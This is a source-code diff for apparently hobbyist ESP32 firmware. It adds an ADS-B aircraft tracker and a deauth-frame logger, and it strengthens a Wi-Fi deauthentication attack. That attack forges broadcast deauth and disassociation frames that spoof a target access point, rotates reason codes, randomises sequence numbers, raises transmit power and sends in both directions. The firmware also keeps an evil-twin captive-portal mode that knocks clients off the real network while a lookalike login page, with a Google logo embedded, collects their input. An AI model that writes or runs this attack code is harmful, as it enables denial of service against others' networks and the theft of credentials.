@@ -13,6 +13,9 @@
 #include "lwip/ip4_addr.h"
 #include "../web/web_server.h"
 #include "time_sync.h"
+#include "haptic.h"
+#include <HTTPClient.h>
+#include <ArduinoJson.h>
 
 #define MAX_WIFI_RESULTS 30
 #define MAX_BLE_RESULTS  30
@@ -36,12 +39,58 @@ static volatile bool flag_deauth_detect = false;
 static volatile bool flag_stop = false;
 static volatile bool flag_arp_scan = false;
 static volatile bool flag_ip_sniff = false;
+static volatile bool flag_adsb_track = false;
+
+static double adsb_target_lat = 0.0;
+static double adsb_target_lon = 0.0;
+static char adsb_airport_name_str[32] = "";
+static bool adsb_waiting_wifi = false;
+static uint32_t adsb_wifi_start_ms = 0;
+static AdsbAircraft current_adsb_aircraft;
+static bool adsb_has_aircraft = false;
+static char adsb_status_str[64] = "Initializing...";
+static uint32_t adsb_last_poll_ms = 0;
+static char adsb_last_flight_route[32] = "";
+static char adsb_last_flight_code[16] = "";
 
 static volatile int ble_scan_duration = 10;
 
 static int sniffer_channel = 0;
 static int sniffer_packets = 0;
 static int deauth_detected_count = 0;
+
+struct DeauthEvent {
+    uint8_t src[6];
+    uint8_t dst[6];
+    uint8_t bssid[6];
+    uint8_t subtype;
+    uint32_t time;
+};
+
+#define MAX_DEAUTH_EVENTS 5
+static DeauthEvent deauth_log[MAX_DEAUTH_EVENTS];
+static int deauth_log_count = 0;
+static int deauth_log_index = 0;
+
+void recon_clear_deauth_events(void) {
+    deauth_log_count = 0;
+    deauth_log_index = 0;
+}
+
+int recon_get_deauth_event_count(void) {
+    return deauth_log_count;
+}
+
+bool recon_get_deauth_event(int idx, uint8_t* src, uint8_t* dst, uint8_t* bssid, uint8_t* subtype, uint32_t* time) {
+    if (idx < 0 || idx >= deauth_log_count) return false;
+    int actual_idx = (deauth_log_index - deauth_log_count + idx + MAX_DEAUTH_EVENTS) % MAX_DEAUTH_EVENTS;
+    memcpy(src, deauth_log[actual_idx].src, 6);
+    memcpy(dst, deauth_log[actual_idx].dst, 6);
+    memcpy(bssid, deauth_log[actual_idx].bssid, 6);
+    *subtype = deauth_log[actual_idx].subtype;
+    *time = deauth_log[actual_idx].time;
+    return true;
+}
 static bool sniffer_hopping = false;
 static uint32_t sniffer_hop_time = 0;
 static bool was_web_server_active = false;
@@ -93,8 +142,7 @@ static const uint8_t PWNGRID_BEACON_HDR[] = {
 
 static void bitgotchi_write_pcap(const char* bssid_str, const uint8_t* frame, uint16_t len) {
     if (!SD.begin()) return;
-    if (!SD.exists("/Bitpcap")) SD.mkdir("/Bitpcap");
-    if (!SD.exists("/Bitpcap/handshakes")) SD.mkdir("/Bitpcap/handshakes");
+    if (!SD.exists("/bit")) SD.mkdir("/bit");
 
     char path[80];
     char safe_bssid[18];
@@ -102,7 +150,7 @@ static void bitgotchi_write_pcap(const char* bssid_str, const uint8_t* frame, ui
     for (int i = 0; i < (int)strlen(safe_bssid); i++) {
         if (safe_bssid[i] == ':') safe_bssid[i] = '-';
     }
-    snprintf(path, sizeof(path), "/Bitpcap/handshakes/%s.pcap", safe_bssid);
+    snprintf(path, sizeof(path), "/bit/%s.pcap", safe_bssid);
 
     bool is_new = !SD.exists(path);
     File f = SD.open(path, FILE_APPEND);
@@ -191,6 +239,9 @@ static uint32_t blackout_ch_time = 0;
 static char deauth_bssid[18] = {0};
 static int  deauth_channel = 1;
 
+static void start_adsb_track(void);
+static void poll_adsb_track(void);
+
 enum ReconState {
     RECON_IDLE,
     RECON_WIFI_SCANNING,
@@ -204,7 +255,8 @@ enum ReconState {
     RECON_EVIL_TWIN,
     RECON_BEACON_SPAMMING,
     RECON_ARP_SCANNING,
-    RECON_IP_SNIFFING
+    RECON_IP_SNIFFING,
+    RECON_ADSB_TRACKING
 };
 static ReconState state = RECON_IDLE;
 
@@ -235,14 +287,28 @@ static int  sniff_unique_ip_count = 0;
 static File sniff_pcap_file;
 
 static uint8_t deauth_frame[26] = {
-    0xC0, 0x00,
-    0x3a, 0x01,                         
+    0xC0, 0x00,                         
+    0x00, 0x00,                         
     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
-    0xf0, 0xff,                         
-    0x02, 0x00                          
+    0x00, 0x00,                         
+    0x07, 0x00                          
 };
+
+static uint8_t disassoc_frame[26] = {
+    0xA0, 0x00,                         
+    0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00,
+    0x07, 0x00
+};
+
+static const uint8_t deauth_reason_codes[] = {0x01, 0x04, 0x06, 0x07, 0x08};
+static uint8_t deauth_reason_idx = 0;
+static uint32_t deauth_burst_count = 0;
 
 static const char GOOGLE_LOGO_B64[] =
     "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3MiIgaGVpZ2h0PSIyNCI+PHRleHQgeT0iMjAiIGZvbnQtc2l6ZT0iMjIiIGZvbnQtZmFtaWx5PSdBcmlhbCxzYW5zLXNlcmlmJyBmb250LXdlaWdodD0nYm9sZCc+PHTqc3BhbiBmaWxsPScjNDI4NUY0Jz5HPC90c3Bhbj48dHNwYW4gZmlsbD0nI0VBNDMzNSc+bzwvdHNwYW4+PHRzcGFuIGZpbGw9JyNGQkJDMDQnPm88L3RzcGFuPjx0c3BhbiBmaWxsPScjNDI4NUY0Jz5nPC90c3Bhbj48dHNwYW4gZmlsbD0nIzM0QTg1Myc+bDwvdHNwYW4+PHRzcGFuIGZpbGw9JyNFQTQzMzUnPmU8L3RzcGFuPjwvdGV4dD48L3N2Zz4=";
@@ -552,39 +618,114 @@ static void start_deauth(void) {
 
     uint8_t bssid_bytes[6];
     parse_bssid(deauth_bssid, bssid_bytes);
-    // Deauth frame: DA=broadcast, SA=target BSSID, BSSID=target BSSID
-    memset(deauth_frame + 4, 0xFF, 6);           // DA: broadcast
-    memcpy(deauth_frame + 10, bssid_bytes, 6);   // SA: target AP
-    memcpy(deauth_frame + 16, bssid_bytes, 6);   // BSSID: target AP
 
-    // Use STA mode + promiscuous for reliable raw frame injection on ESP32-S3
-    WiFi.softAPdisconnect(true);
-    WiFi.mode(WIFI_STA);
-    WiFi.disconnect();
-    vTaskDelay(pdMS_TO_TICKS(100));
-    esp_wifi_set_promiscuous(true);
-    esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);
+    
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
     vTaskDelay(pdMS_TO_TICKS(50));
 
+    
+    WiFi.disconnect(true);
+    WiFi.softAPdisconnect(true);
+    vTaskDelay(pdMS_TO_TICKS(100));
+
+    
+    WiFi.mode(WIFI_AP_STA);
+    vTaskDelay(pdMS_TO_TICKS(100));
+
+    
+    WiFi.softAP("SCR_Scan", nullptr, deauth_channel, 0, 4);
+    vTaskDelay(pdMS_TO_TICKS(100));
+
+    
+    esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);
+    esp_wifi_set_max_tx_power(78);
+
+    
+    esp_wifi_set_promiscuous(true);
+    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL };
+    esp_wifi_set_promiscuous_filter(&filt);
+
+    
+    memset(deauth_frame   + 4,  0xFF, 6);
+    memcpy(deauth_frame   + 10, bssid_bytes, 6);
+    memcpy(deauth_frame   + 16, bssid_bytes, 6);
+    memset(disassoc_frame + 4,  0xFF, 6);
+    memcpy(disassoc_frame + 10, bssid_bytes, 6);
+    memcpy(disassoc_frame + 16, bssid_bytes, 6);
+
+    deauth_reason_idx  = 0;
+    deauth_burst_count = 0;
     deauth_frames_sent = 0;
     deauth_last_burst_ms = 0;
     state = RECON_DEAUTH_SENDING;
+    Serial.println("[RECON] Deauth ready — WIFI_IF_STA mode active");
 }
 
 static void poll_deauth(void) {
-    // Inject via STA interface — works reliably on ESP32-S3 in promiscuous mode
-    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
+    uint32_t now = millis();
+    if (now - deauth_last_burst_ms < 35) return; 
+    deauth_last_burst_ms = now;
+
+    
+    deauth_burst_count++;
+    if (deauth_burst_count % 20 == 0) {
+        deauth_reason_idx = (deauth_reason_idx + 1) % 5;
+        uint8_t rc = deauth_reason_codes[deauth_reason_idx];
+        deauth_frame[24]   = rc;
+        disassoc_frame[24] = rc;
+    }
+
+    
+    uint16_t seq = random(0, 4096);
+    uint8_t seq_high = (seq >> 4) & 0xFF;
+    uint8_t seq_low = ((seq & 0x0F) << 4);
+
+    deauth_frame[22] = seq_high;
+    deauth_frame[23] = seq_low;
+    disassoc_frame[22] = seq_high;
+    disassoc_frame[23] = seq_low;
+
+    
+    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame,   sizeof(deauth_frame),   false);
     vTaskDelay(1 / portTICK_PERIOD_MS);
-    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
+    esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
     vTaskDelay(1 / portTICK_PERIOD_MS);
-    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
-    deauth_frames_sent += 3;
+
+    
+    uint8_t swapped_deauth[26],  swapped_disassoc[26];
+    memcpy(swapped_deauth,   deauth_frame,   26);
+    memcpy(swapped_disassoc, disassoc_frame, 26);
+    
+    
+    memcpy(swapped_deauth   + 4,  deauth_frame + 10, 6);
+    memset(swapped_deauth   + 10, 0xFF, 6);
+    memcpy(swapped_disassoc + 4,  disassoc_frame + 10, 6);
+    memset(swapped_disassoc + 10, 0xFF, 6);
+
+    
+    uint16_t seq2 = random(0, 4096);
+    swapped_deauth[22] = (seq2 >> 4) & 0xFF;
+    swapped_deauth[23] = ((seq2 & 0x0F) << 4);
+    swapped_disassoc[22] = swapped_deauth[22];
+    swapped_disassoc[23] = swapped_deauth[23];
+
+    esp_wifi_80211_tx(WIFI_IF_AP, swapped_deauth,   26, false);
+    vTaskDelay(1 / portTICK_PERIOD_MS);
+    esp_wifi_80211_tx(WIFI_IF_AP, swapped_disassoc, 26, false);
+    deauth_frames_sent += 4;
 }
 
 static void stop_deauth_and_restore(void) {
-    Serial.printf("[RECON] Deauth stopped after %d frames. Restoring state...\n", deauth_frames_sent);
+    Serial.printf("[RECON] Deauth stopped after %d frames. Restoring WiFi...\n", deauth_frames_sent);
     esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
+    vTaskDelay(pdMS_TO_TICKS(100)); 
+    
     WiFi.softAPdisconnect(true);
+    WiFi.disconnect(true);
+    vTaskDelay(pdMS_TO_TICKS(100)); 
+    
     if (was_web_server_active) {
         web_server_init();
     } else {
@@ -602,7 +743,25 @@ static void IRAM_ATTR promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
     if (type == WIFI_PKT_MGMT) {
         uint8_t subtype = (frame[0] >> 4) & 0x0F;
         sniffer_packets++;
-        if (subtype == 0x0C || subtype == 0x0A) deauth_detected_count++;
+        if (subtype == 0x0C || subtype == 0x0A) {
+            deauth_detected_count++;
+            DeauthEvent ev;
+            memcpy(ev.src, frame + 10, 6);
+            memcpy(ev.dst, frame + 4, 6);
+            memcpy(ev.bssid, frame + 16, 6);
+            ev.subtype = subtype;
+            ev.time = millis();
+            
+            deauth_log[deauth_log_index] = ev;
+            deauth_log_index = (deauth_log_index + 1) % MAX_DEAUTH_EVENTS;
+            if (deauth_log_count < MAX_DEAUTH_EVENTS) deauth_log_count++;
+
+            Serial.printf("[DEAUTH] Src: %02X:%02X:%02X:%02X:%02X:%02X -> Dst: %02X:%02X:%02X:%02X:%02X:%02X (BSSID: %02X:%02X:%02X:%02X:%02X:%02X) Subtype: 0x%02X\n",
+                frame[10], frame[11], frame[12], frame[13], frame[14], frame[15],
+                frame[4], frame[5], frame[6], frame[7], frame[8], frame[9],
+                frame[16], frame[17], frame[18], frame[19], frame[20], frame[21],
+                subtype);
+        }
 
         if (bitgotchi_active && subtype == 0x08 && len > 16) {
             
@@ -722,6 +881,7 @@ static void poll_sniffer(void) {
 static void start_deauth_detect(void) {
     was_web_server_active = web_server_is_active();
     Serial.println("[RECON] Deauth detector starting");
+    recon_clear_deauth_events();
     WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_STA);
     WiFi.disconnect();
@@ -1099,23 +1259,23 @@ static void start_evil_twin_server(void) {
     esp_wifi_set_promiscuous_rx_cb(nullptr);
 
     WiFi.softAPdisconnect(true);
-    // WIFI_AP_STA: AP serves captive portal, STA (promiscuous) injects deauth frames
+    
     WiFi.mode(WIFI_AP_STA);
     WiFi.disconnect();
     delay(200);
 
-    // Use standard 192.168.4.1 — required for captive portal detection on Android/iOS/Windows
+    
     IPAddress apIP(192, 168, 4, 1);
     IPAddress gateway(192, 168, 4, 1);
     IPAddress subnet(255, 255, 255, 0);
     WiFi.softAPConfig(apIP, gateway, subnet);
     WiFi.softAP(et_ssid, NULL, et_channel, 0, 4);
 
-    // Wait for AP to fully initialize before starting servers
+    
     uint32_t t = millis();
     while (millis() - t < 2500) yield();
 
-    // Enable promiscuous on STA side for raw frame injection
+    
     esp_wifi_set_promiscuous(true);
 
     etServer = new AsyncWebServer(80);
@@ -1182,7 +1342,7 @@ static void poll_evil_twin(void) {
     uint32_t now = millis();
     if (strlen(et_target_bssid) > 0 && (now - et_deauth_last_ms > 100)) {
         et_deauth_last_ms = now;
-        // Inject via STA interface (promiscuous) while AP serves the captive portal
+        
         for (int i = 0; i < 5; i++) {
             esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
         }
@@ -1194,6 +1354,8 @@ static void stop_evil_twin(void) {
     Serial.println("[RECON] Stopping Evil Twin");
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_promiscuous_rx_cb(nullptr);
+    vTaskDelay(pdMS_TO_TICKS(50));
+
     if (dnsServer) {
         dnsServer->stop();
         delete dnsServer;
@@ -1205,6 +1367,8 @@ static void stop_evil_twin(void) {
         etServer = nullptr;
     }
     WiFi.softAPdisconnect(true);
+    vTaskDelay(pdMS_TO_TICKS(100));
+
     if (was_web_server_active) {
         web_server_init();
     } else {
@@ -1267,6 +1431,10 @@ int recon_deauth_detect_count(void) {
     return deauth_detected_count;
 }
 
+bool recon_is_deauth_detecting(void) {
+    return state == RECON_DEAUTH_DETECTING;
+}
+
 bool recon_is_sniffing(void) {
     return state == RECON_SNIFFING || state == RECON_DEAUTH_DETECTING;
 }
@@ -1288,6 +1456,7 @@ void recon_service_loop(void) {
         flag_evil_twin = false;
         flag_arp_scan = false;
         flag_ip_sniff = false;
+        flag_adsb_track = false;
 
         if (state == RECON_WIFI_SCANNING) {
             WiFi.scanDelete();
@@ -1316,6 +1485,13 @@ void recon_service_loop(void) {
             return;
         } else if (state == RECON_IP_SNIFFING) {
             stop_ip_sniff();
+            return;
+        } else if (state == RECON_ADSB_TRACKING) {
+            WiFi.disconnect(true);
+            WiFi.mode(WIFI_OFF);
+            adsb_waiting_wifi = false;
+            adsb_has_aircraft = false;
+            state = RECON_IDLE;
             return;
         }
         state = RECON_IDLE;
@@ -1374,6 +1550,11 @@ void recon_service_loop(void) {
             start_ip_sniff();
             return;
         }
+        if (flag_adsb_track) {
+            flag_adsb_track = false;
+            start_adsb_track();
+            return;
+        }
     }
 
     switch (state) {
@@ -1405,6 +1586,9 @@ void recon_service_loop(void) {
             poll_arp_scan();
             break;
         case RECON_IP_SNIFFING:
+            break;
+        case RECON_ADSB_TRACKING:
+            poll_adsb_track();
             break;
         default:
             break;
@@ -1455,4 +1639,252 @@ void recon_service_loop(void) {
             Serial.println("[BITGOTCHI] Broadcasting PWNGRID beacon...");
         }
     }
+}
+
+static void start_adsb_track(void) {
+    adsb_has_aircraft = false;
+    adsb_last_flight_route[0] = '\0';
+    adsb_last_flight_code[0] = '\0';
+    memset(&current_adsb_aircraft, 0, sizeof(current_adsb_aircraft));
+    
+    if (WiFi.status() == WL_CONNECTED) {
+        adsb_waiting_wifi = false;
+        strncpy(adsb_status_str, "Connected. Fetching data...", sizeof(adsb_status_str)-1);
+        adsb_last_poll_ms = millis() - 10000;
+    } else {
+        time_sync_load_networks();
+        int nc = time_sync_get_saved_network_count();
+        String ssid = "", pass = "";
+        bool hidden = false;
+        bool found_valid = false;
+        for (int i = 0; i < nc; i++) {
+            String s, p;
+            bool h;
+            if (time_sync_get_saved_network(i, s, p, h)) {
+                if (s.length() > 0 && s != "YourSSID") {
+                    ssid = s;
+                    pass = p;
+                    hidden = h;
+                    found_valid = true;
+                    break;
+                }
+            }
+        }
+
+        WiFi.mode(WIFI_STA);
+        if (found_valid) {
+            Serial.printf("[ADSB] Connecting to '%s'...\n", ssid.c_str());
+            snprintf(adsb_status_str, sizeof(adsb_status_str), "Connecting to %s...", ssid.c_str());
+            if (hidden)
+                WiFi.begin(ssid.c_str(), pass.c_str(), 0, nullptr, true);
+            else
+                WiFi.begin(ssid.c_str(), pass.c_str());
+        } else {
+            Serial.println("[ADSB] No custom saved network, auto-connecting...");
+            strncpy(adsb_status_str, "Connecting (Auto)...", sizeof(adsb_status_str)-1);
+            WiFi.begin();
+        }
+        adsb_waiting_wifi = true;
+        adsb_wifi_start_ms = millis();
+    }
+    state = RECON_ADSB_TRACKING;
+}
+
+static void fetch_adsb_route(const char* flight) {
+    if (!flight || strlen(flight) == 0 || strcmp(flight, "N/A") == 0) {
+        return;
+    }
+    if (strcmp(flight, adsb_last_flight_code) == 0) {
+        return;
+    }
+    
+    strncpy(adsb_last_flight_code, flight, sizeof(adsb_last_flight_code)-1);
+    adsb_last_flight_route[0] = '\0';
+    
+    JsonDocument requestDoc;
+    JsonArray planes = requestDoc["planes"].to<JsonArray>();
+    JsonObject plane = planes.add<JsonObject>();
+    plane["callsign"] = flight;
+    plane["lat"] = 0;
+    plane["lng"] = 0;
+    String requestBody;
+    serializeJson(requestDoc, requestBody);
+    
+    HTTPClient http;
+    http.begin("https://api.adsb.lol/api/0/routeset");
+    http.addHeader("Content-Type", "application/json");
+    http.setTimeout(3000);
+    int httpCode = http.POST(requestBody);
+    if (httpCode == HTTP_CODE_OK) {
+        JsonDocument responseDoc;
+        DeserializationError error = deserializeJson(responseDoc, http.getStream());
+        if (!error && responseDoc.is<JsonArray>() && responseDoc.as<JsonArray>().size() > 0) {
+            JsonObject flightInfo = responseDoc[0];
+            if (flightInfo.containsKey("_airport_codes_iata")) {
+                String routeStr = flightInfo["_airport_codes_iata"].as<String>();
+                strncpy(adsb_last_flight_route, routeStr.c_str(), sizeof(adsb_last_flight_route)-1);
+            }
+        }
+    }
+    http.end();
+}
+
+static float calculate_distance(double lat1, double lon1, double lat2, double lon2) {
+    double dLat = (lat2 - lat1) * M_PI / 180.0;
+    double dLon = (lon2 - lon1) * M_PI / 180.0;
+    double rLat1 = lat1 * M_PI / 180.0;
+    double rLat2 = lat2 * M_PI / 180.0;
+    double a = sin(dLat/2) * sin(dLat/2) +
+               sin(dLon/2) * sin(dLon/2) * cos(rLat1) * cos(rLat2);
+    double c = 2 * atan2(sqrt(a), sqrt(1-a));
+    return 6371.0 * c;
+}
+
+static float calculate_bearing(double lat1, double lon1, double lat2, double lon2) {
+    double lat1_rad = lat1 * M_PI / 180.0;
+    double lat2_rad = lat2 * M_PI / 180.0;
+    double lon_diff_rad = (lon2 - lon1) * M_PI / 180.0;
+    double y = sin(lon_diff_rad) * cos(lat2_rad);
+    double x = cos(lat1_rad) * sin(lat2_rad) - sin(lat1_rad) * cos(lat2_rad) * cos(lon_diff_rad);
+    double bearing_rad = atan2(y, x);
+    double bearing_deg = bearing_rad * 180.0 / M_PI;
+    if (bearing_deg < 0) {
+        bearing_deg += 360.0;
+    }
+    return (float)bearing_deg;
+}
+
+static void poll_adsb_track(void) {
+    uint32_t now = millis();
+
+    if (adsb_waiting_wifi) {
+        wl_status_t st = WiFi.status();
+        if (st == WL_CONNECTED) {
+            adsb_waiting_wifi = false;
+            strncpy(adsb_status_str, "Connected. Fetching data...", sizeof(adsb_status_str)-1);
+            adsb_last_poll_ms = now - 10000;
+        } else if (now - adsb_wifi_start_ms > ARP_WIFI_TIMEOUT_MS) {
+            Serial.println("[ADSB] WiFi connection timeout, aborting");
+            strncpy(adsb_status_str, "WiFi Timeout", sizeof(adsb_status_str)-1);
+            adsb_waiting_wifi = false;
+            stop_deauth_and_restore();
+            state = RECON_IDLE;
+            return;
+        }
+        return;
+    }
+
+    if (WiFi.status() != WL_CONNECTED) {
+        strncpy(adsb_status_str, "WiFi Disconnected", sizeof(adsb_status_str)-1);
+        adsb_has_aircraft = false;
+        return;
+    }
+
+    if (now - adsb_last_poll_ms < 5000) return;
+    adsb_last_poll_ms = now;
+
+    HTTPClient http;
+    char url[128];
+    snprintf(url, sizeof(url), "https://api.adsb.lol/v2/closest/%.6f/%.6f/50", adsb_target_lat, adsb_target_lon);
+    http.begin(url);
+    http.setTimeout(4000);
+    int httpCode = http.GET();
+    if (httpCode == HTTP_CODE_OK) {
+        JsonDocument doc;
+        DeserializationError error = deserializeJson(doc, http.getStream());
+        if (!error && doc.containsKey("ac") && doc["ac"].as<JsonArray>().size() > 0) {
+            JsonObject ac = doc["ac"][0];
+            
+            String flight = ac["flight"] | "N/A";
+            flight.trim();
+            
+            bool is_new_ac = false;
+            if (!adsb_has_aircraft || flight != current_adsb_aircraft.flight) {
+                is_new_ac = true;
+            }
+            
+            strncpy(current_adsb_aircraft.flight, flight.c_str(), sizeof(current_adsb_aircraft.flight)-1);
+            
+            String reg = ac["r"] | "N/A";
+            strncpy(current_adsb_aircraft.reg, reg.c_str(), sizeof(current_adsb_aircraft.reg)-1);
+            
+            String type = ac["t"] | "N/A";
+            strncpy(current_adsb_aircraft.type, type.c_str(), sizeof(current_adsb_aircraft.type)-1);
+            
+            current_adsb_aircraft.alt_baro = ac["alt_baro"] | 0;
+            current_adsb_aircraft.gs = ac["gs"].as<float>();
+            current_adsb_aircraft.true_heading = ac["true_heading"].as<float>();
+            current_adsb_aircraft.baro_rate = ac["baro_rate"] | 0;
+            
+            String squawk = ac["squawk"] | "----";
+            strncpy(current_adsb_aircraft.squawk, squawk.c_str(), sizeof(current_adsb_aircraft.squawk)-1);
+            
+            String emergency = ac["emergency"] | "none";
+            strncpy(current_adsb_aircraft.emergency, emergency.c_str(), sizeof(current_adsb_aircraft.emergency)-1);
+            
+            double ac_lat = ac["lat"] | 0.0;
+            double ac_lon = ac["lon"] | 0.0;
+            current_adsb_aircraft.distance = calculate_distance(adsb_target_lat, adsb_target_lon, ac_lat, ac_lon);
+            current_adsb_aircraft.bearing = calculate_bearing(adsb_target_lat, adsb_target_lon, ac_lat, ac_lon);
+
+            Serial.printf("[ADSB] parsed ac: %s, lat: %.6f, lon: %.6f, target_lat: %.6f, target_lon: %.6f, dist: %.2f, bearing: %.2f\n",
+                          current_adsb_aircraft.flight, ac_lat, ac_lon, adsb_target_lat, adsb_target_lon,
+                          current_adsb_aircraft.distance, current_adsb_aircraft.bearing);
+
+            fetch_adsb_route(current_adsb_aircraft.flight);
+            
+            if (strlen(adsb_last_flight_route) > 0) {
+                strncpy(current_adsb_aircraft.route, adsb_last_flight_route, sizeof(current_adsb_aircraft.route)-1);
+            } else {
+                strncpy(current_adsb_aircraft.route, "N/A", sizeof(current_adsb_aircraft.route)-1);
+            }
+
+            if (is_new_ac) {
+                if (strcmp(current_adsb_aircraft.squawk, "7500") == 0 ||
+                    strcmp(current_adsb_aircraft.squawk, "7600") == 0 ||
+                    strcmp(current_adsb_aircraft.squawk, "7700") == 0) {
+                    haptic_alarm();
+                } else {
+                    haptic_success();
+                }
+            }
+
+            adsb_has_aircraft = true;
+            strncpy(adsb_status_str, "Tracking...", sizeof(adsb_status_str)-1);
+        } else {
+            adsb_has_aircraft = false;
+            strncpy(adsb_status_str, "No aircraft nearby", sizeof(adsb_status_str)-1);
+        }
+    } else {
+        adsb_has_aircraft = false;
+        snprintf(adsb_status_str, sizeof(adsb_status_str), "API Error: %d", httpCode);
+    }
+    http.end();
+}
+
+void recon_request_adsb_track(double lat, double lon, const char* name) {
+    adsb_target_lat = lat;
+    adsb_target_lon = lon;
+    if (name) {
+        strncpy(adsb_airport_name_str, name, sizeof(adsb_airport_name_str)-1);
+    } else {
+        adsb_airport_name_str[0] = '\0';
+    }
+    flag_adsb_track = true;
+}
+
+bool recon_is_adsb_tracking(void) {
+    return state == RECON_ADSB_TRACKING;
+}
+
+bool recon_adsb_has_aircraft(void) {
+    return adsb_has_aircraft;
+}
+
+const AdsbAircraft* recon_get_adsb_aircraft(void) {
+    return &current_adsb_aircraft;
+}
+
+const char* recon_get_adsb_status(void) {
+    return adsb_status_str;
 }
